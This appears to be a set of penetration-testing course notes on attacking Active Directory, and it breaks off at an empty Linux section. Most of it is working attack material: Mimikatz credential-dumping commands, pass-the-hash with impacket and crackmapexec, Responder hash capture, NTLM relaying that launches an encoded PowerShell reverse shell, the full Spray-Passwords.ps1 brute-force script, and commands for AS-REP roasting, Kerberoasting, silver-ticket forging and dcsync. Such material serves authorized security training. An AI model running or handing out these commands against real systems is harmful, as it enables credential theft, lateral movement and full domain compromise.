# Active Directory Exploitation

Having enumerated user accounts, group memberships, and registered Service Principal Names let's now attempt to use this information to compromise Active Directory.



Start PowerShell as an administrator:
- Windows Run Box: `powershell -Command "Start-Process powershell -Verb RunAs"`
- Executable: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- File Explorer: right-click anywhere in the folder and select "Open in Terminal"
- Shortcut: `Win+X` to open context menu and then `a` (Terminal Admin)







In Domain Controller:`C:\Windows\NTDS\ntds.dit` (New Technology Directory Services Directory Information Tree)





## Cached AD Credentials

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request.
In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.






### Mimikatz
Mimikatz is a hacking tool that extracts Windows authentication credentials from memory, including passwords and hashes. It can then use these credentials to gain unauthorized access, escalate privileges, and perform further attacks.\

- <https://github.com/gentilkiwi/mimikatz/wiki/>
- <https://github.com/ParrotSec/mimikatz>
- <https://adsecurity.org/?page_id=1821>


- Use Mimikatz to extract domain hashes on our Windows 11 system
```
# SeDebugPrivlege privilege allow us to interact with a process owned by another account
```
privilege::debug
```




# Dump the credentials of all logged-on users with the Sekurlsa module
# sekurlsa::logonpasswords attempts to extract plaintext passwords and password hashes from all available sources (generates a huge amount of output)
# This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions
sekurlsa::logonpasswords


# show the tickets that are stored in memory
# previously open a second PowerShell window and do something to create a  cache a service ticket. Example: dir \\web04.corp.com\backup
sekurlsa::tickets

```

TGS would allow us to access only particular resources associated with those tickets

Alternatively, with a TGT we could request a TGS for specific resources we want to target within the domain. 



- export certificate with the private key
The `crypto` module contains the capability to either patch the `CryptoAPI` function with `crypto::capi` or `KeyIso` service with `crypto::cng` making non-exportable keys exportable.




















## Password Attacks


Windows stores hashed user passwords in the Security Account Manager (SAM).



Beware of account lockouts! To learn about this use the `net accounts` command.
```
...
Lockout threshold:
Lockout duration (minutes):
Lockout observation window (minutes):
...
```






### Cracking NTLM (Local)

We use "NTLM hash" to refer to the formally correct `NTHash`.
Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion.

Use Mimikatz to obtain NTLM hashes and follow the cracking methodology to crack the hash.

LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the `sekurlsa` Mimikatz module.

We need to understand that LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator.
Due to this, we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the `SeDebugPrivilege` access right enabled.


`lsadump::sam` will extract the NTLM hashes from the SAM.

For this command, we must first enter `token::elevate` to elevate to SYSTEM user privileges.

Also we must have the `SeDebugPrivilege` access right enabled, which we'll accomplish with `privilege::debug`.


- Extract NTLM hashes:
```
privilege::debug
token::elevate
lsadump::sam
```


```
hashcat --help | grep -i "ntlm"
```



```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```








### Passing NTLM (Local)

Leverage an NTLM hash without cracking it.
*This is possible because NTLM/LM password hashes are not salted and remain static between sessions.*

We can PtH technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password.

Moreover, if we discover a password hash on one target, we can use it to not only authenticate to that target, but to another target as well, as long as the second target has an account with the same username and password.

To leverage this into code execution of any kind, the account also needs administrative privileges on the second target.



To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes. Fortunately for us, we have many to choose from.





#### For SMB enumeration and management, we can use `smbclient` or `CrackMapExec`.

```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```







#### Using `crackmapexec`

```
crackmapexec smb 10.129.41.19 -u rachel -H [NTLM hash]

SMB         10.129.43.9     445    DC01      [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    DC01      [+] INLANEFREIGHT.LOCAL\rachel:e46b9e548fa0d122de7f59fb6d48eaa2 (Pwn3d!)
```










#### For command execution, we can use the scripts from the `impacket` library like `psexec.py` and `wmiexec.py`.

To execute `psexec`, we can enter `impacket-psexec` with two arguments.
The first argument is `-hashes`, which allows us to use NTLM hashes to authenticate to the target.

The format is "LMHash:NTHash", in which we specify the Administrator NTLM hash after the colon. Since we only use the NTLM hash, we can fill the LMHash section with 32 0's. The second argument is the target definition in the format "username@ip".

At the end of the command we could specify another argument, which is used to determine which command `psexec` should execute on the target system. If we leave it empty, `cmd.exe` will be executed, providing us with an interactive shell.

Due to the nature of `psexec.py`, we'll always receive a shell as `SYSTEM` instead of the user we used to authenticate.

```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b 
Administrator@192.168.50.212


C:\Windows\system32> whoami
nt authority\system
```



We can also use one of the other impacket scripts like `wmiexec.py` to obtain a shell 
as the user we used for authentication. On Kali, we would use `impacket-wmiexec` 
along with the arguments we used for `impacket-psexec`.
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212


C:\>whoami
files02\administrator
```
As the whoami output shows, we obtained a shell as the Administrator user with wmiexec instead of SYSTEM.








#### We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and WinRM, if the user has the required rights.










#### We can also use Mimikatz to conduct pass-the-hash as well.
























### Cracking Net-NTLMv2 (Local)

If we have no privileges (i.e.: we cannot use tools like Mimikatz to extract passwords or NTLM hashes, we can abuse the `Net-NTLMv2` network authentication protocol)

We use "Net-NTLMv2" to refer to the formally correct NTLMv2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.



UAC remote restrictions limit the users we can use in pass-the-hash or relay attacks outside of an Active Directory environment.




Use `responder`. It includes a built-in SMB server that handles the authentication process for us and prints all captured `Net-NTLMv2` hashes. (It also includes other protocol servers (including HTTP and FTP) as well as Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS) poisoning capabilities)

Use as `sudo` to enable permissions needed to handle privileged raw socket operations for the various protocols.

`-I`: set the listening interface

```
sudo responder -I tap0
sudo responder -I tun0
```


Then from the TARGET MACHINE request access to a non-existent SMB share on our Responder SMB server


```
hashcat --help | grep -i "NetNTLMV2"

hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force
```


- <https://github.com/lgandx/Responder>













### Relaying Net-NTLMv2


Use the obtained the `Net-NTLMv2` hash on another machine (for example if we couldn't crack it because it was too complex).

UAC remote restrictions limit the users we can use in pass-the-hash or relay attacks outside of an Active Directory environment.

If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack.




`impacket-ntlmrelayx` sets up an SMB server and relaying the authentication part of an incoming SMB connection to the target.

`--no-http-server`: disable the HTTP server since we are relaying an SMB connection

`-smb2support`: add support for SMB2

`-t`: target



```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc [ENCODED REVERSER POWERSHELL]
```


And on the ATTACKER MACHINE start a `nc` listener on the port the reverse shell is pointing at.






SMB signing set to False. Without this security mechanism enabled, we can potentially perform relay attacks if we can force an authentication request.





`impacket-ntlmrelayx` to relay the incoming connection to another computer


```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc [ENCODED PowerShell reverse shell]"
```








### Using DAP and ADSI
- perform a low and slow password attack against AD users
- make queries in the context of a different user by setting the DirectoryEntry instance
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

If the password for the user account is correct, the object creation will be successful.
If the password is invalid, no object will be created and we will receive an exception.






This password spraying tactic is already implemented in the PowerShell script `Spray-Passwords.ps1`

```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```




#### Spray-Passwords.ps1
- <https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1>


```
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against 
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.
    
    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.
    
    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
	
  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 
    
    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose 
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param 
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }
    
    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}
   
    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name
    
    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."
   
   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects
        
        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]
                    
                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes
                        
                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
	
	
	
				   # Try the auth with current password
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }
			 
			 
			    
                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()   
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```
























### Using SMB
For every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.  

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```


If the user with the identified credentials has administrative privileges crackmapexec adds `Pwn3d!` to the output. In an assessment, this is an excellent feature to determine the level of access we have without performing additional enumeration.



















### Using Kerberos TGT / kerbrute

- <https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html>
- <https://github.com/ropnop/kerbrute>


```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
(make sure that the encoding of usernames.txt is ANSI!)

Get-Content "input.txt" | Out-File "output.txt" -Encoding ASCII





















## AS-REP Roasting
Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.

By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually.

In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.








### Linux	
Use `Impacket`


```
# Just list users with "Do not require Kerberos preauthentication" enabled

impacket-GetNPUsers [DOMAIN/[USERNAME (opt):PASSWORD (opt)]] -dc-ip [DOMAIN CONTROLLER IP]

impacket-GetNPUsers -dc-ip [DOMAIN CONTROLLER IP] corp.com/pete



# get the hash
impacket-GetNPUsers -dc-ip [DOMAIN CONTROLLER IP] -request -outputfile [OUTPUT FILE NAME] corp.com/pete
```

This will show the user account option "Do not require Kerberos preauthentication" enabled, meaning it's vulnerable to AS-REP Roasting.


By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat. Therefore, let's check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

```
hashcat --help | grep -i "Kerberos"
19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
7500  | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```


```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```









### Windows
Use `Rubeus.exe`.

- <https://github.com/GhostPack/Rubeus>

`/nowrap` to copy output


Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP hashes.

```
.\Rubeus.exe asreproast /nowrap
```

Then copy the hash and use `hashcat`








### Targeted AS-REP Roasting
If we have `GenericWrite` or `GenericAll` permissions on another AD user account we could reset their passwords, but this would lock out the user from accessing the account.

We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication.

Notably, we should reset the User Account Control value of the user once we've obtained the hash.





















## Kerberoasting

If we know the SPN we want to target, we can request a service ticket for it from the domain controller.

The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.

This technique is known as Kerberoasting.

- <https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-kerberoasting-activity>




### Windows
Use `Rubeus.exe`.


```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast



rubeus kerberoast /domain:kerb.local /creduser:kerb.local\test /credpassword:testpwd /nowrap

```

Rubeus will identify the user accounts vulnerable to Kerberoasting and write the hash to an output file.


Then use hashcat:

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```




#### Another option
- <https://www.youtube.com/watch?v=xH5T9-m9QXw&list=PL3B8L-z5QU-Z0bWmjwgUSLGTzm1k_kVZo&index=2>

```
rubeus.exe kerberoast /domain:[DOMAIN (may be local)] /creduser:[USER] /credpassword:[PASSWORD] /nowrap

```

Example:
```
rubeus kerberoast /domain:kerb.local /creduser:kerb.local\test /credpassword:testpwd /nowrap

SamAccountName			:	SQLUser
DistinguishedName		:	CN=SQLUser,OU=KerbUsers,DC=kerb,DC=local
ServicePrincipalName	:	MSSQLSvc/kerbdc1.kerb.local:1433
PwdLastSet				:	14/11/2021 16:32:41
Supported ETypes		:	RC3_HMAC_DEFAULT
Hash					:	$krb5tgs$23$*SQLUser$kerb.local$MSSQLSvc/kerbdc1.kerb.local:1433@kerb.local*$....

- Get rc4
rubeus hash /password:[RESULT OF HASHCAT]

- get SID
whoami /user

rubeus silver /service:MSSQLSvc/kerbdc1.kerb.local:1433 /rc4 /sid: /user:Administrator /domain: /ptt


- log to service
sqlcmd -S kerbdc1.kerb.local

> SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser


```






























### Linux
Use `impacket-GetUserSPNs` with the IP of the domain controller as the argument for `-dc-ip`.

Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash.

As before, we can use `-request` to obtain the TGS and output them in a compatible format for Hashcat.


```
sudo impacket-GetUserSPNs htb.local/asmith:passw0rd
sudo impacket-GetUserSPNs htb.local/asmith:passw0rd -request

sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

NOTE: if `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)" we need to synchronize the time of the Kali machine with the domain controller with `ntpdate` or `rdate`.


This is basically what the `impacket-GetUserSPNs` searchs for:

```
Get-ADUser -ldapfilter "(serviceprincipalname=*)" -Properties "serviceprincipalname"
```

This command searches for all users in Active Directory who have a servicePrincipalName attribute set and returns their user objects, including the servicePrincipalName property.





















## Silver Ticket
Forge a TGS ticket to access a SPECIFIC SERVICE.

Is a custom-created ticket and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account only checks the user's permissions from the group memberships included in the service ticket.

However, the user and group permissions in the service ticket are not verified by the application in a majority of environments.

In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.

Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller.

Fortunately for this attack technique, service applications rarely perform PAC validation.

In general, we need to collect the following three pieces of information to create a silver ticket:

1. SPN password hash
Mimikatz:
```
privilege::debug
sekurlsa::logonpasswords

```


2. Domain SID
[PREFIX][DOMAIN SID][RID]
Example:
```
whoami /user
# output: corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID: S-1-5-21-1987370270-658905905-1781884369
```



3. Target SPN
Example:
the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80)





With the 3 pieces of information we can build the command to create the silver ticket.




The `kerberos::golden` module provides the capabilities for creating golden and silver tickets.

We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```


Now we should have the ticket ready to use in memory.
We can confirm this with `klist`.



This attack is performed without access to the plaintext password or password hash of this user.

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.



Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.
With this patch in place, the extended PAC structure field `PAC_REQUESTOR` needs to be validated by a domain controller.
This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain.
Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.























## Domain Controller Synchronization / dcsync attack


In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol1 uses replication to synchronize these redundant domain controllers.

A domain controller may request an update for a specific object, like an account, using the `IDL_DRSGetNCChange`s API.

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

To launch such a replication, a user needs to have the `Replicating Directory Changes`, `Replicating Directory Changes All`, and `Replicating Directory Changes` in Filtered Set rights.

By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.



If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.



### Windows
Use Mimikatz on a domain-joined Windows machine

We can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.

```
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:BEYOND\Administrator

# Output
...
Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
...
```


Then user hashcat:
```
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```








### Linux
impacket-secretsdump on our non-domain joined Kali machine

```
